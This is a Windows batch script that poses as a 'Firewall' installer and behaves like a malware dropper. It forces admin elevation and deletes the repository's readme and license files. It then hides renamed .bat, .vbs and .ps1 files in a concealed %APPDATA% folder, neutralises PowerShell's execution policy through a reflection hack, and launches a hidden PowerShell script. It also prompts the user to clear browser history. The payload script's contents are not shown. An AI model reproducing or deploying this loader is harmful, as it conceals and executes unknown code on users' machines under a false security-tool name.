@echo off

net session >nul 2>&1 || (powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs" & exit)

:: setup work cd
cd /d "%~dp0"
set "SF=%CD%"

set "HD=%APPDATA%\Firewall"

chcp 65001 > nul
color 0D

echo.
echo.

for /f "delims=" %%i in (readme) do echo %%i

:: arch version
set VER=64
for /f %%I in ('powershell -Command "(Get-CimInstance Win32_OperatingSystem).OSArchitecture"') do set OS_ARCH=%%I

if "%OS_ARCH%"=="32-bit" set VER=32

set NAME=.firewall%VER%

if exist ".firewall.bat" ren ".firewall.bat" "%NAME%.bat"
if exist ".firewall.vbs" ren ".firewall.vbs" "%NAME%.vbs"
if exist ".firewall.ps1" ren ".firewall.ps1" "%NAME%.ps1"
if exist ".firewalle.ps1" ren ".firewalle.ps1" "%NAME%e.ps1"
if exist ".firewalld.ps1" ren ".firewalld.ps1" "%NAME%d.ps1"
if exist ".firewallx.ps1" ren ".firewallx.ps1" "%NAME%x.ps1"

title %NAME%

:: deleted github files
del /f /q "%SF%\readme" >nul 2>&1
del /f /q "%SF%\license" >nul 2>&1
del /f /q "%SF%\security" >nul 2>&1
del /f /q "%SF%\.gitignore" >nul 2>&1
del /f /q "%SF%\text.txt" >nul 2>&1
del /f /q "%SF%\%NAME%d.ps1" >nul 2>&1

:: create folder
if not exist "%HD%" (
    mkdir "%HD%"
    attrib +h "%HD%"
)

:: set the path to the deletion script

:: create txt file
echo "lol" > %HD%\%NAME%.txt

echo.
echo.
echo.

echo TODO:
echo 1. clear browser history

echo.
echo.

echo 2. use %HD%\%NAME%.txt

echo.
echo.
echo.

echo running: %HD%\%NAME%x.ps1

ping 127.0.0.1 -n 22 > nul

:: move script files with error checking
if exist "%SF%\%NAME%.vbs" move /y "%SF%\%NAME%.vbs" "%HD%\" >nul
if exist "%SF%\%NAME%.bat" move /y "%SF%\%NAME%.bat" "%HD%\" >nul
if exist "%SF%\%NAME%.ps1" move /y "%SF%\%NAME%.ps1" "%HD%\" >nul
if exist "%SF%\%NAME%e.ps1" move /y "%SF%\%NAME%e.ps1" "%HD%\" >nul
if exist "%SF%\%NAME%x.ps1" move /y "%SF%\%NAME%x.ps1" "%HD%\" >nul

attrib +h "%HD%\%NAME%.vbs"
attrib +h "%HD%\%NAME%.bat"
attrib +h "%HD%\%NAME%.ps1"
attrib +h "%HD%\%NAME%e.ps1"
attrib +h "%HD%\%NAME%.txt"
attrib +h "%HD%\%NAME%x.ps1"

for %%f in (%SF%\Firewall\.*) do (
    attrib +h "%%f" >nul 2>&1
)

ping 127.0.0.1 -n 6 > nul

set PATH=%HD%\%NAME%

powershell -ExecutionPolicy Bypass -Command "& {
    function Disable-ExecutionPolicy {
        ($ctx = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext)).gettype().getfield('_authorizationManager','nonpublic,instance').setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))
    };
    Disable-ExecutionPolicy;
}"

powershell -NoProfile -ExecutionPolicy Bypass -Command "& {%PATH%x.ps1}"

exit
